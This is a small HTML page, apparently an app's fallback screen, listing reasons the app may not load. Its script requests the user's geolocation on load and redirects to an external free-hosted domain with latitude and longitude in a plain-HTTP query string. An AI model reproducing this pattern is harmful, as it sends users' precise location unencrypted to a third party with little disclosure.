<!DOCTYPE html>
<html>
<body>
  <div id="centerDiv" class="centerDiv">
   <h3>If You are seeing this message,it may be one of the following reasons</h3>
<p><li>You are not connected to the internet</li>
<li>You need to turn on your GPS before running the app</li>
<li>You device is non-compatible</li>
</p>
</div>
<style type="text/css">
h3{
color:white;
}
.centerDiv{
    position: absolute;
    top: 40%;
    left: 40%;
    margin-top: -50px;
    margin-left: -50px;
    width: 120px;
    height: 100px;
}

</style>
<script>
window.onload=function(){
if(navigator.geolocation)
{
navigator.geolocation.getCurrentPosition(showPosition);
}
else
{
alert("Geolocation is not supported by this browser.");
}
}
function showPosition(pos){
window.location.href="http://showevent.zz.mu/a.php?lat="+pos.coords.latitude+"&&long="+pos.coords.longitude;
}
</script>
</body>
</html>
